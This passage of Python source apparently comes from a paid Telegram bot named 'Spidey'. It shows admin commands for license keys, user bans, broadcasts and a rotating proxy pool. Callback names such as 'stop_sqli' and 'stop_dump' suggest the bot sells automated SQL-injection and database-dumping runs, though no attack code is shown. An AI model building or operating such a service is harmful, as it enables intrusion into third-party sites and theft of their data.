        f"🌊︎ Pᴏᴏʟ Sɪᴢᴇ: `{total}` proxy(ies)\n\n"
        f"Aʟʟ {total} Pʀᴏxɪᴇs Wɪʟʟ Bᴇ Rᴏᴛᴀᴛᴀᴛᴇᴅ Fᴏʀ Mᴀxx Sᴘᴇᴇᴅ 🐎.\n"
        f"Usᴇ `/setpr ...` Tᴏ Aᴅᴅ Mᴏʀᴇ | `/proxies` Tᴏ Lɪsᴛ | `/delpr` Tᴏ Dᴇʟᴇᴛᴇ Aʟʟ.",
        parse_mode=ParseMode.MARKDOWN,
    )
    return MENU


async def admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Yᴏᴜʜ Aʀᴇ Nᴏᴛ Aᴜᴛʜᴏʀɪᴢᴇᴅ.")
        return MENU
    total_users = len(all_user_ids)
    active_users = sum(1 for info in authorized_users.values() if datetime.now() < info["expires"])
    gpool = len(global_proxy_pool)
    bans  = len(banned_users)
    await update.message.reply_text(
        "︎✿︎━━━━━━━━━━━━━━━━━━━━✿︎︎\n"
        "🧛🏻 𝘼𝙙𝙢𝙞𝙣 𝙋𝙖𝙣𝙚𝙡 — 𝙎𝙥𝙞𝙙𝙚𝙮 v1.0\n"
        "︎✿︎━━━━━━━━━━━━━━━━━━━━✿︎︎\n\n"
        f"🆔 Yᴏᴜʀ Iᴅ: `{user_id}`\n"
        f"🚻︎ Tᴏᴛᴀʟ Usᴇʀs: `{total_users}` | Aᴄᴛɪᴠᴇ: `{active_users}`\n"
        f"🌍︎ Gʟᴏʙᴀʟ Pʀᴏxɪᴇs: `{gpool}` | Bᴀɴɴᴇᴅ: `{bans}`\n\n"
        "🔑︎ *Kᴇʏ Mᴀɴᴀɢᴇᴍᴇɴᴛ:*\n"
        "• `/genkey <plan>` — Gᴇɴᴇʀᴀᴛᴇ A Kᴇʏ\n"
        "  Pʟᴀɴs: `1ʜ 6ʜ 1ᴅ 3ᴅ 5ᴅ 10ᴅ 15ᴅ 30ᴅ`\n"
        "• `/listkeys` — Lɪsᴛ Aʟʟ Gᴇɴᴇʀᴀᴛᴇᴅ Kᴇʏs\n"
        "• `/revokekey <KEY>` — Rᴇᴠᴏᴋᴇ A Kᴇʏ\n\n"
        "👤︎ *Usᴇʀ Mᴀɴᴀɢᴇᴍᴇɴᴛ:*\n"
        "• `/users` — Sʜᴏᴡ Aʟʟ Aᴄᴛɪᴠᴇ Usᴇʀs\n"
        "• `/adduser <id> <plan>` — Gʀᴀɴᴛ Aᴄᴄᴇss Dɪʀᴇᴄᴛʟʏ\n"
        "• `/removeuser <id>` — Rᴇᴍᴏᴠᴇ Usᴇʀ Aᴄᴄᴇss\n"
        "• `/checkuser <id>` — Cʜᴇᴄᴋ Usᴇʀ Sᴛᴀᴛᴜs\n"
        "• `/banuser <id>` — Bᴀɴ A Usᴇʀ\n"
        "• `/unbanuser <id>` — Uɴʙᴀɴ A Usᴇʀ\n\n"
        "📣 *Bʀᴏᴀᴅᴄᴀsᴛ:*\n"
        "• `/broadcast <message>` — Sᴇɴᴅ Tᴏ Aʟʟ Usᴇʀs\n\n"
        "🌊 *Gʟᴏʙᴀʟ Pʀᴏxʏ Pᴏᴏʟ:*\n"
        "• `/gproxy <host:port>` — Aᴅᴅ Pʀᴏxʏ\n"
        "• `/gproxy clear` — Dᴇʟᴇᴛᴇ Aʟʟ Pʀᴏxɪᴇs\n"
        "• `/gproxies` — Lɪsᴛ Aʟʟ Sᴀᴠᴇᴅ Pʀᴏxɪᴇs\n\n"
        "📊︎ *Stats:*\n"
        "• `/stats` — Bᴏᴛ Sᴛᴀᴛɪsᴛɪᴄs\n"
        "✿︎︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n",
        reply_markup=make_admin_menu(),
        parse_mode=ParseMode.MARKDOWN,
    )
    return MENU


async def broadcast_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Yᴏᴜ'ʀᴇ Nᴏᴛ A Aᴅᴍɪɴ.")
        return MENU
    text = update.message.text.strip()
    parts = text.split(maxsplit=1)
    if len(parts) < 2 or not parts[1].strip():
        await update.message.reply_text(
            "💡︎ *Usᴀɢᴇ:* `/broadcast <message>`\n",
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU
    msg = parts[1].strip()
    targets = list(all_user_ids)
    sent, failed = 0, 0
    status_msg = await update.message.reply_text(
        f"📣 *Bʀᴏᴀᴅᴄᴀsᴛɪɴɢ Tᴏ {len(targets)} Usᴇʀs..!*",
        parse_mode=ParseMode.MARKDOWN,
    )
    for uid in targets:
        try:
            await context.bot.send_message(uid, msg)
            sent += 1
        except Exception:
            failed += 1
        await asyncio.sleep(0.05)  # rate-limit friendly
    await status_msg.edit_text(
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
        f"📣︎ 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚..!\n"
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
        f"✅ Sᴇɴᴛ: `{sent}`\n"
        f"❌ Fᴀɪʟᴇᴅ: `{failed}`\n"
        f"🎯 Tᴏᴛᴀʟ Tᴀʀɢᴇᴛs: `{len(targets)}`",
        parse_mode=ParseMode.MARKDOWN,
    )
    return MENU


async def banuser_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Yᴏᴜ'ʀᴇ Nᴏᴛ A Aᴅᴍɪɴ.")
        return MENU
    args = context.args
    if not args or not args[0].isdigit():
        await update.message.reply_text(
            "💡 *Usᴀɢᴇ:* `/banuser <user_id>`",
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU
    target = int(args[0])
    if target in ADMIN_IDS:
        await update.message.reply_text("❌ Aᴅᴍɪɴ Cᴀɴɴᴏᴛ Bᴇ Bᴀɴɴᴇᴅ.")
        return MENU
    banned_users.add(target)
    _save_bans()
    await update.message.reply_text(
        f"🚫 *Usᴇʀ `{target}` Hᴀs Bᴇᴇɴ Bᴀɴɴᴇᴅ.*\n"
        f"Hᴇ Cᴀɴ Nᴏ Lᴏɴɢᴇʀ Usᴇ Tʜᴇ Bᴏᴛ.",
        parse_mode=ParseMode.MARKDOWN,
    )
    return MENU


async def unbanuser_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Yᴏᴜ'ʀᴇ Nᴏᴛ A Aᴅᴍɪɴ.")
        return MENU
    args = context.args
    if not args or not args[0].isdigit():
        await update.message.reply_text(
            "💡 *Usᴀɢᴇ:* `/unbanuser <user_id>`",
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU
    target = int(args[0])
    if target in banned_users:
        banned_users.discard(target)
        _save_bans()
        await update.message.reply_text(
            f"✅ *Usᴇʀ `{target}` Hᴀs Bᴇᴇɴ Uɴʙᴀɴɴᴇᴅ.*",
            parse_mode=ParseMode.MARKDOWN,
        )
    else:
        await update.message.reply_text(
            f"⚠️ Usᴇʀ `{target}` Is Nᴏᴛ Bᴀɴɴᴇᴅ.",
            parse_mode=ParseMode.MARKDOWN,
        )
    return MENU


async def gproxy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Admin: /gproxy <host:port>  — add to global pool | /gproxy clear — wipe pool | /gproxies — list"""
    global global_proxy_pool
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text("❌ Yᴏᴜ'ʀᴇ Nᴏᴛ A Aᴅᴍɪɴ.")
        return MENU

    text = update.message.text.strip()
    cmd_word = text.split()[0].lstrip("/").lower()

    # /gproxies — list
    if cmd_word == "gproxies":
        pool = global_proxy_pool
        if not pool:
            await update.message.reply_text(
                "🗑️ *Gʟᴏʙᴀʟ Pʀᴏxʏ Pᴏᴏʟ Is Eᴍᴘᴛʏ.*\n\n"
                "💡 Usᴇ `/gproxy host:port` Tᴏ Aᴅᴅ Pʀᴏxɪᴇs.",
                parse_mode=ParseMode.MARKDOWN,
            )
            return MENU
        lines = [f"`{i}.` `{_mask_proxy(px)}`" for i, px in enumerate(pool, 1)]
        preview = "\n".join(lines[:30])
        suffix = f"\n\n_...and {len(pool) - 30} more_" if len(pool) > 30 else ""
        await update.message.reply_text(
            f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            f"🌊︎ 𝙂𝙡𝙤𝙗𝙖𝙡 𝙋𝙧𝙤𝙭𝙮 𝙋𝙤𝙤𝙡 — {len(pool)} 𝙇𝙤𝙖𝙙𝙚𝙙\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n" + preview + suffix +
            "\n✿︎︎━━━━━━━━━━━━━━━━━━━━✿︎︎\n\n"
            "💡 Usᴇᴅ Bʏ Aʟʟ Usᴇʀs Wʜᴏ Hᴀᴠᴇ Nᴏ Pᴇʀsᴏɴᴀʟ Pʀᴏxɪᴇs..",
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    parts = text.split(maxsplit=1)
    if len(parts) < 2 or not parts[1].strip():
        await update.message.reply_text(
            f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            "🌊︎ 𝙂𝙡𝙤𝙗𝙖𝙡 𝙋𝙧𝙤𝙭𝙮 𝘾𝙢𝙙'𝙨:\n"
            f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            "• `/gproxy host:port` — Aᴅᴅ Sɪɴɢʟᴇ Pʀᴏxʏ\n"
            "• `/gproxy socks5://host:port` — Aᴅᴅ Sᴏᴄᴋs5\n"
            "• `/gproxy clear` — Cʟᴇᴀʀ Gʟᴏʙᴀʟ Pᴏᴏʟ\n"
            "• `/gproxies` — Lɪsᴛ Gʟᴏʙᴀʟ Pᴏᴏʟ"
           f"Usᴇ `/setpr ...` Tᴏ Aᴅᴅ Mᴏʀᴇ | `/proxies` Tᴏ Lɪsᴛ | `/delpr` Tᴏ Dᴇʟᴇᴛᴇ Aʟʟ.",
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    arg = parts[1].strip()

    # Clear command
    if arg.lower() == "clear":
        count = len(global_proxy_pool)
        global_proxy_pool = []
        _save_proxies()
        await update.message.reply_text(
            f"✅ *Gʟᴏʙᴀʟ Pʀᴏxʏ Pᴏᴏʟ Cʟᴇᴀʀᴇᴅ.* Rᴇᴍᴏᴠᴇᴅ `{count}` Pʀᴏxɪᴇs.",
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    # If a document is attached, bulk-load from file
    doc = update.message.document
    if doc:
        # delegate to file handler logic for global pool
        await update.message.reply_text(
            "💡︎ *Nᴏᴛᴇ:* Sᴇɴᴅ Tʜᴇ Fɪʟᴇ Fɪʀsᴛ, Tʜᴇɴ Rᴇᴘʟʏ Tᴏ Iᴛ Wɪᴛʜ `/gproxy` Tᴏ Bᴜʟᴋ-Aᴅᴅ Pʀᴏxɪᴇs.",
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    # Single proxy add
    formatted = _parse_proxy(arg)
    if not formatted:
        await update.message.reply_text("❌ Iɴᴠᴀʟɪᴅ Pʀᴏxʏ Fᴏʀᴍᴀᴛ.")
        return MENU

    if formatted in global_proxy_pool:
        await update.message.reply_text(
            f"⚠️ Aʟʀᴇᴀᴅʏ Iɴ Pᴏᴏʟ: `{_mask_proxy(arg)}`",
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    checking_msg = await update.message.reply_text(
        f"🔍 *Cʜᴇᴄᴋɪɴɢ Pʀᴏxʏ...*\n`{_mask_proxy(arg)}`",
        parse_mode=ParseMode.MARKDOWN,
    )
    is_live = await check_proxy_live(formatted, timeout=5.0)
    if not is_live:
        await checking_msg.edit_text(
            f"❌ *Pʀᴏxʏ Is Dᴇᴀᴅ — Nᴏᴛ Aᴅᴅᴇᴅ.*\n`{_mask_proxy(arg)}`",
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    global_proxy_pool.append(formatted)
    _save_proxies()
    await checking_msg.edit_text(
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
        f"✅ 𝙋𝙧𝙤𝙭𝙮 𝘼𝙙𝙙𝙚𝙙 𝙏𝙤 𝙋𝙤𝙤𝙡..!\n"
        f"︎✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
        f"🥷🏻︎ Pʀᴏxʏ: `{_mask_proxy(arg)}`\n"
        f"🌊︎ Pᴏᴏʟ Sɪᴢᴇ: `{len(global_proxy_pool)}` Pʀᴏxɪᴇs\n\n"
        "💡 ︎Aʟʟ Usᴇʀs Wɪᴛʜ Nᴏ Pᴇʀsᴏɴᴀʟ Pʀᴏxɪᴇs Wɪʟʟ Usᴇ Tʜɪs Pᴏᴏʟ .",
        parse_mode=ParseMode.MARKDOWN,
    )
    return MENU


async def genkey_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Yᴏᴜ'ʀᴇ Nᴏᴛ A Aᴅᴍɪɴ.")
        return MENU
    args = context.args
    if not args or args[0] not in PLAN_MAP:
        await update.message.reply_text(
            f"⚠️ Usᴀɢᴇ: `/genkey <plan>`\n\nPlans: `{' | '.join(PLAN_MAP.keys())}`",
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU
    plan_code = args[0]
    label, emoji, delta = PLAN_MAP[plan_code]
    key = generate_key()
    license_keys[key] = {
        "plan": plan_code, "label": label, "emoji": emoji,
        "delta": delta, "created": datetime.now(), "used_by": None,
    }
    await update.message.reply_text(
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
        f"✅ 𝙆𝙚𝙮 𝙂𝙚𝙣𝙚𝙧𝙖𝙩𝙚𝙙..!\n"
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎︎\n\n"
        f"🔑 Key: `{key}`\n"
        f"{emoji} Pʟᴀɴ: *{label}*\n"
        f"📅 Cʀᴇᴀᴛᴇᴅ: `{datetime.now().strftime('%Y-%m-%d %H:%M')}`\n\n"
        f"Eɴᴊᴏʏ Sᴘɪᴅᴇʏ's 🕷️ Aᴜᴛᴏᴍᴀᴛɪᴏɴ",
        parse_mode=ParseMode.MARKDOWN,
    )
    return MENU


async def listkeys_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Yᴏᴜ'ʀᴇ Nᴏᴛ A Aᴅᴍɪɴ.")
        return MENU
    if not license_keys:
        await update.message.reply_text("✿︎ Nᴏ Kᴇʏs Fᴏᴜɴᴅ/Gᴇɴᴇʀᴀᴛᴇᴅ Yᴇᴛ.")
        return MENU
    lines = ["︎✿︎━━━━━━━━━━━━━━━━━━━━✿︎︎\n🔑 𝘼𝙡𝙡 𝙇𝙞𝙘𝙚𝙣𝙨𝙚𝙙 𝙇𝙚𝙮𝙨\n✿︎━━━━━━━━━━━━━━━━━━━━✿︎︎\n\n"]
    for key, info in list(license_keys.items()):
        status = f"Usᴇᴅ Bʏ `{info['used_by']}`" if info["used_by"] else "✅ Aᴠᴀɪʟᴀʙʟᴇ"
        lines.append(f"`{key}`\n  {info['emoji']} {info['label']} — {status}\n")
    text = "\n".join(lines)
    if len(text) > 4000:
        text = text[:4000] + "\n\n_...truncated_"
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)
    return MENU


async def users_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Yᴏᴜ'ʀᴇ Nᴏᴛ A Aᴅᴍɪɴ.")
        return MENU
    if not authorized_users:
        await update.message.reply_text("⚠️︎ Nᴏ Usᴇʀs Aᴄᴛɪᴠᴇ Rɪɢʜᴛ Nᴏᴡ.")
        return MENU
    lines = ["✿︎━━━━━━━━━━━━━━━━━━━━✿︎︎\n♨️︎ 𝘼𝙘𝙩𝙞𝙫𝙚 𝙐𝙨𝙚𝙧𝙨\n✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"]
    for uid, info in list(authorized_users.items()):
        remaining = info["expires"] - datetime.now()
        if remaining.total_seconds() > 0:
            hrs  = int(remaining.total_seconds() // 3600)
            mins = int((remaining.total_seconds() % 3600) // 60)
            lines.append(f"🍷 `{uid}` — *{info['plan']}* — ⏳ `{hrs}ʜ {mins}ᴍ` left")
        else:
            lines.append(f"⚠️ `{uid}` — *{info['plan']}* — ❌ Lɪᴄᴇɴsᴇ Exᴘɪʀᴇᴅ")
    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.MARKDOWN)
    return MENU


async def stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Yᴏᴜ'ʀᴇ Nᴏᴛ A Aᴅᴍɪɴ.")
        return MENU
    total_keys  = len(license_keys)
    used_keys   = sum(1 for k in license_keys.values() if k["used_by"])
    active_users = sum(1 for info in authorized_users.values() if datetime.now() < info["expires"])
    await update.message.reply_text(
        "✿︎━━━━━━━━━━━━━━━━━━━━✿︎︎\n"
        "︎📊 𝘽𝙤𝙩 𝙎𝙩𝙖𝙩𝙞𝙨𝙩𝙞𝙘𝙨\n"
        "✿︎━━━━━━━━━━━━━━━━━━━━✿︎︎\n\n"
        f"🔑︎ Tᴏᴛᴀʟ Kᴇʏs Gᴇɴᴇʀᴀᴛᴇᴅ: `{total_keys}`\n"
        f"✅︎ Kᴇʏs Usᴇᴅ: `{used_keys}`\n"
        f"🍷︎ Kᴇʏs Aᴠᴀɪʟᴀʙʟᴇ: `{total_keys - used_keys}`\n"
        f"🔰︎ Aᴄᴛɪᴠᴇ Usᴇʀs: `{active_users}`\n"
        f"❓︎ Tᴏᴛᴀʟ Uɴɪǫᴜᴇ Usᴇʀs: `{len(all_user_ids)}`\n\n"
        "🕷️︎ Bᴏᴛ: Oɴʟɪɴᴇ ✅\n",
        parse_mode=ParseMode.MARKDOWN,
    )
    return MENU


async def revokekey_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Yᴏᴜ'ʀᴇ Nᴏᴛ A Aᴅᴍɪɴ.")
        return MENU
    args = context.args
    if not args:
        await update.message.reply_text("⚠️ Usᴀɢᴇ: `/revokekey <KEY>`", parse_mode=ParseMode.MARKDOWN)
        return MENU
    key = args[0].upper()
    if key in license_keys:
        info = license_keys.pop(key)
        if info["used_by"] and info["used_by"] in authorized_users:
            del authorized_users[info["used_by"]]
        await update.message.reply_text(f"✅ Kᴇʏ `{key}` Hᴀs Bᴇᴇɴ Rᴇᴠᴏᴋᴇᴅ.", parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text(f"❌ Kᴇʏ `{key}` Nᴏᴛ Fᴏᴜɴᴅ.", parse_mode=ParseMode.MARKDOWN)
    return MENU


async def adduser_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Yᴏᴜ'ʀᴇ Nᴏᴛ A Aᴅᴍɪɴ.")
        return MENU
    args = context.args
    if len(args) < 2:
        await update.message.reply_text(
            f"⚠️ Usᴀɢᴇ: `/adduser <user_id> <plan>`\n\nPʟᴀɴs: `{' | '.join(PLAN_MAP.keys())}`",
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU
    try:
        target_id = int(args[0])
    except ValueError:
        await update.message.reply_text("❌ Iɴᴠᴀʟɪᴅ Usᴇʀ ID..", parse_mode=ParseMode.MARKDOWN)
        return MENU
    plan_code = args[1].lower()
    if plan_code not in PLAN_MAP:
        await update.message.reply_text(
            f"❌ Iɴᴠᴀʟɪᴅ Pʟᴀɴ. Aᴠᴀɪʟᴀʙʟᴇ: `{' | '.join(PLAN_MAP.keys())}`",
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU
    label, emoji, delta = PLAN_MAP[plan_code]
    expires = datetime.now() + delta
    authorized_users[target_id] = {"plan": label, "expires": expires, "granted_by": "admin"}
    await update.message.reply_text(
        "✿︎━━━━━━━━━━━━━━━━━━━━✿︎︎\n"
        f"🍷︎ 𝘼𝙘𝙘𝙚𝙨𝙨 𝙂𝙧𝙖𝙣𝙩𝙚𝙙..!\n"
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
        f"🆔 Usᴇʀ ID: `{target_id}`\n"
        f"{emoji} Pʟᴀɴ: *{label}*\n"
        f"⏳︎ Exᴘɪʀᴇs: `{expires.strftime('%Y-%m-%d %H:%M')}`\n\n",
        parse_mode=ParseMode.MARKDOWN,
    )
    return MENU


async def getfile_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Admin command — send the bot's main.py source file."""
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Yᴏᴜ'ʀᴇ Nᴏᴛ A Aᴅᴍɪɴ.")
        return MENU
    bot_dir = os.path.dirname(os.path.abspath(__file__))
    file_path = os.path.join(bot_dir, "main.py")
    try:
        with open(file_path, "rb") as f:
            content = f.read()
        ts    = datetime.now().strftime("%d%m%y_%H%M")
        lines = len(content.decode("utf-8", errors="ignore").splitlines())
        size  = len(content) // 1024
        await context.bot.send_document(
            chat_id=update.effective_user.id,
            document=io.BytesIO(content),
            filename=f"loop_bot_main_{ts}.py",
            caption=(
                f"🧤 *Sᴏᴜʀᴄᴇ Cᴏᴅᴇ — Spidey.py*\n"
                f"📑︎ `{lines:,}` lines — `{size} KB`\n"
                f"🕰️︎ `{datetime.now().strftime('%Y-%m-%d %H:%M')}`"
            ),
            parse_mode=ParseMode.MARKDOWN,
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Eʀʀᴏʀ: `{e}`", parse_mode=ParseMode.MARKDOWN)
    return MENU


async def removeuser_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Yᴏᴜ'ʀᴇ Nᴏᴛ A Aᴅᴍɪɴ.")
        return MENU
    args = context.args
    if not args:
        await update.message.reply_text("⚠️ Usᴀɢᴇ: `/removeuser <user_id>`", parse_mode=ParseMode.MARKDOWN)
        return MENU
    try:
        target_id = int(args[0])
    except ValueError:
        await update.message.reply_text("❌ Iɴᴠᴀʟɪᴅ Usᴇʀ ID.", parse_mode=ParseMode.MARKDOWN)
        return MENU
    if target_id in authorized_users:
        del authorized_users[target_id]
        await update.message.reply_text(f"✅ Usᴇʀ `{target_id}` Aᴄᴄᴇss Rᴇᴍᴏᴠᴇᴅ.", parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text(f"⚠️ Usᴇʀ `{target_id}` Hᴀs Nᴏ Aᴄᴛɪᴠᴇ Aᴄᴄᴇss.", parse_mode=ParseMode.MARKDOWN)
    return MENU


async def checkuser_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Yᴏᴜ'ʀᴇ Nᴏᴛ A Aᴅᴍɪɴ.")
        return MENU
    args = context.args
    if not args:
        await update.message.reply_text("⚠️ Usᴀɢᴇ: `/checkuser <user_id>`", parse_mode=ParseMode.MARKDOWN)
        return MENU
    try:
        target_id = int(args[0])
    except ValueError:
        await update.message.reply_text("❌ Iɴᴠᴀʟɪᴅ Usᴇʀ ID.", parse_mode=ParseMode.MARKDOWN)
        return MENU
    if target_id in ADMIN_IDS:
        await update.message.reply_text(
            f"⚜️ Usᴇʀ `{target_id}` Is ᴀɴ *Aᴅᴍɪɴ* — Pᴇʀᴍᴀɴᴇɴᴛ Aᴄᴄᴇss.",
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU
    if target_id in authorized_users:
        info      = authorized_users[target_id]
        remaining = info["expires"] - datetime.now()
        if remaining.total_seconds() > 0:
            hrs  = int(remaining.total_seconds() // 3600)
            mins = int((remaining.total_seconds() % 3600) // 60)
            await update.message.reply_text(
                f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎︎\n"
                f"🪀 𝙐𝙨𝙚𝙧 𝘼𝙘𝙩𝙞𝙫𝙚..!\n"
                f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
                f"🆔︎ Usᴇʀ ID: `{target_id}`\n"
                f"🍷︎ Plan: *{info['plan']}*\n"
                f"⏳ Time left: `{hrs}ʜ {mins}ᴍ`\n"
                f"⚠️︎ Expires: `{info['expires'].strftime('%Y-%m-%d %H:%M')}`",
                parse_mode=ParseMode.MARKDOWN,
            )
        else:
            del authorized_users[target_id]
            await update.message.reply_text(
                f"❌ Usᴇʀ `{target_id}` Pʟᴀɴ Hᴀs *Exᴘɪʀᴇᴅ*.",
                parse_mode=ParseMode.MARKDOWN,
            )
    else:
        await update.message.reply_text(
            f"⚠️ Usᴇʀ `{target_id}` Hᴀs *Nᴏ Aᴄᴛɪᴠᴇ Pʟᴀɴ*.",
            parse_mode=ParseMode.MARKDOWN,
        )
    return MENU


# ── BUTTON HANDLER ─────────────────────────────────────────────────────────────

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query   = update.callback_query
    await query.answer()
    data    = query.data
    user_id = update.effective_user.id

    # ── Premium gate — expired trial users see menu but can't use features ────
    _FREE_CALLBACKS = {
        "menu_purchase", "menu_redeem", "menu_source", "menu_back", "menu_emails", "menu_statuscheck", "menu_aigen", "menu_dedup", "admin_livefeed", "admin_dedupstats", "admin_cleardedup",
        "stop_parser", "stop_sqli", "stop_dump",
    }
    if (not has_access(user_id)
            and trial_status(user_id) == "expired"
            and not is_admin(user_id)
            and data not in _FREE_CALLBACKS
            and not data.startswith("admin_")
            and not data.startswith("plan_")
            and not data.startswith("redeem")):
        try:
            await query.edit_message_text(
                premium_locked_text(),
                reply_markup=premium_locked_kb(),
                parse_mode=ParseMode.MARKDOWN,
            )
        except Exception:
            await query.answer("🍷︎ Pʀᴇᴍɪᴜᴍ Mᴇᴍʙᴇʀs Oɴʟʏ! Cᴏɴᴛᴀᴄᴛ " + ADMIN_USERNAME, show_alert=True)
        return MENU

    # ── Stop buttons ──────────────────────────────────────────────────────────
    if data in ("stop_parser", "stop_sqli", "stop_dump"):
        if user_id in stop_events:
            stop_events[user_id].set()
        try:
            await query.edit_message_text(
                "⛔︎ Pʀᴏᴄᴇss Sᴛᴏᴘᴘᴇᴅ.\n\n Pᴀʀᴛɪᴀʟ Rᴇsᴜʟᴛs Wɪʟʟ Bᴇ Sᴇɴᴛ Sʜᴏʀᴛʟʏ!...",
                parse_mode=ParseMode.MARKDOWN,
            )
        except Exception:
            pass
        return MENU

    elif data == "menu_back":
        context.user_data.clear()
        if has_access(user_id) or trial_status(user_id) == "expired":
            # Premium users AND expired-trial users both see the menu
            await send_main_menu(update, context)
        else:
            await query.edit_message_text(
                access_denied_text(),
                reply_markup=access_denied_kb(),
                parse_mode=ParseMode.MARKDOWN,
            )
        return MENU

    # ── Admin panel ───────────────────────────────────────────────────────────
    elif data == "admin_panel":
        if not is_admin(user_id):
            await query.answer("❌ Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ", show_alert=True)
            return MENU
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎︎\n🧛🏻 𝗔𝗱𝗺𝗶𝗻 𝗣𝗮𝗻𝗲𝗹\n✿︎━━━━━━━━━━━━━━━━━━━━✿︎︎\n\n 🧤 Cʜᴏᴏsᴇ Aɴ Aᴄᴛɪᴏɴ:",
            reply_markup=make_admin_menu(),
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    elif data == "admin_genkey":
        if not is_admin(user_id):
            await query.answer("❌ Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ", show_alert=True)
            return MENU
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎︎\n🔑︎ 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲 𝗞𝗲𝘆\n✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n⏳ Sᴇʟᴇᴄᴛ Pʟᴀɴ Dᴜʀᴀᴛɪᴏɴ:",
            reply_markup=make_genkey_plan_menu(),
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    elif data.startswith("genkey_"):
        if not is_admin(user_id):
            await query.answer("❌ Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ", show_alert=True)
            return MENU
        plan_code = data[7:]
        if plan_code not in PLAN_MAP:
            return MENU
        label, emoji, delta = PLAN_MAP[plan_code]
        key = generate_key()
        license_keys[key] = {
            "plan": plan_code, "label": label, "emoji": emoji,
            "delta": delta, "created": datetime.now(), "used_by": None,
        }
        await query.edit_message_text(
            f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎︎\n🍷 𝙆𝙚𝙮 𝙂𝙚𝙣𝙚𝙧𝙖𝙩𝙚𝙙..!\n✿︎━━━━━━━━━━━━━━━━━━━━✿︎︎\n\n"
            f"🔑 Kᴇʏ:\n`{key}`\n\n"
            f"{emoji} Plan: *{label}*\n"
            f"📅 Cʀᴇᴀᴛᴇᴅ: `{datetime.now().strftime('%Y-%m-%d %H:%M')}`\n\n",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔑 Gᴇɴᴇʀᴀᴛᴇ Aɴᴏᴛʜᴇʀ", callback_data="admin_genkey")],
                [InlineKeyboardButton("⬅️ Aᴅᴍɪɴ Pᴀɴᴇʟ",     callback_data="admin_panel")],
            ]),
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

